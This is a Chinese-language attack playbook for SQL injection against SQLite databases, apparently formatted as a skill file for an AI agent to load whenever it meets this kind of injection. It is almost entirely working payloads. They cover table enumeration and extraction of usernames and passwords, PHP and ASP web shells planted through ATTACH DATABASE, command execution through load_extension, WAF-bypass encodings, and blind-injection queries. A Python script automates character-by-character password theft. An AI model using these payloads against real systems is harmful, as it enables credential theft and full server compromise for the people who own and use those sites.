---
name: sqli-sqlite
description: Use when encountering SQLite database injection - covering version detection, table enumeration, data extraction, file operations and RCE techniques
---

# SQLite注入攻击

## Info

- **Domain**: web
- **Tags**: web, sqli, sqlite, database

## 攻击思路

```
探测注入点 → 版本识别 → 枚举表结构 → 提取数据 → 文件操作/RCE
```

## SQLite特性函数

| 函数 | 用途 |
|------|------|
| sqlite_version() | 版本信息 |
| sqlite_master | 元数据表 |
| pragma_database_list | 数据库列表 |
| load_extension() | 加载扩展 |

## 信息收集

```sql
-- 版本
' UNION SELECT sqlite_version(),NULL--

-- 数据库列表
' UNION SELECT name,NULL FROM pragma_database_list--

-- 表名枚举
' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--

-- 获取建表语句(包含列名)
' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' AND name='users'--
```

## 数据提取

```sql
-- 枚举列名(通过sqlite_master.sql)
' UNION SELECT sql,NULL FROM sqlite_master WHERE name='users'--

-- 提取数据
' UNION SELECT username,password FROM users--

-- 多列合并
' UNION SELECT username||':'||password,NULL FROM users--

-- 分页提取
' UNION SELECT username,password FROM users LIMIT 1 OFFSET 0--
' UNION SELECT username,password FROM users LIMIT 1 OFFSET 1--
```

## 文件操作

```sql
-- SQLite数据库文件通常可直接下载
-- 数据库文件路径: /var/www/html/database.db

-- 通过load_extension加载扩展(需启用)
' SELECT load_extension('/lib/libsqlite3.so')--

-- 附加数据库
' ATTACH DATABASE '/var/www/html/shell.php' AS shell;--
' CREATE TABLE shell.test(data TEXT);--
' INSERT INTO shell.test VALUES('<?php system($_GET[c]);?>');--
```

## RCE技术

| 方法 | 条件 | Payload |
|------|------|---------|
| load_extension | 启用扩展加载 | SELECT load_extension('恶意.so') |
| ATTACH写文件 | 有写权限 | ATTACH + 写入WebShell |
| exec扩展 | 安装了exec扩展 | SELECT exec('id') |

```sql
-- 写入WebShell
' ATTACH DATABASE '/var/www/html/shell.php' AS pwn;--
' CREATE TABLE pwn.test(data TEXT);--
' INSERT INTO pwn.test VALUES('<?php system($_GET[c]);?>');--

-- Windows路径
' ATTACH DATABASE 'C:\inetpub\wwwroot\shell.asp' AS pwn;--
' CREATE TABLE pwn.test(data TEXT);--
' INSERT INTO pwn.test VALUES('<%execute(request("c"))%>');--
```

## WAF绕过

| 绕过方法 | Payload |
|----------|---------|
| 注释混淆 | UNION/**/SELECT |
| 大小写混合 | UnIoN SeLeCt |
| URL编码 | %55%4e%49%4f%4e |
| NULL填充 | UNION SELECT NULL,NULL,NULL |
| Hex编码 | SELECT hex(column) FROM table |

```sql
-- 注释绕过
'/**/UNION/**/SELECT/**/name,NULL/**/FROM/**/sqlite_master--

-- Hex编码绕过
' UNION SELECT hex(username),hex(password) FROM users--
```

## 时间盲注

```sql
-- SQLite没有内置sleep,使用CASE+重查询
' AND CASE WHEN (SELECT 1) THEN RANDOMBLOB(100000000) ELSE 0 END--

-- 或使用substr逐字符判断
' AND substr((SELECT password FROM users LIMIT 1),1,1)='a'--
```

## 布尔盲注

```sql
-- 基于响应差异判断
' AND (SELECT COUNT(*) FROM users)>0--
' AND substr((SELECT password FROM users LIMIT 1),1,1)='a'--

-- Python脚本自动化
import requests
result = ""
for i in range(1, 50):
    for c in "abcdefghijklmnopqrstuvwxyz0123456789":
        payload = f"' AND substr((SELECT password FROM users LIMIT 1),{i},1)='{c}'--"
        r = requests.get(f"http://target?id=1{payload}")
        if "success" in r.text:
            result += c
            break
```

## 攻击检测

| 检测方法 | Payload |
|----------|---------|
| 单引号测试 | id=1' |
| UNION测试 | id=1 UNION SELECT NULL,NULL |
| 版本探测 | id=1 UNION SELECT sqlite_version(),NULL |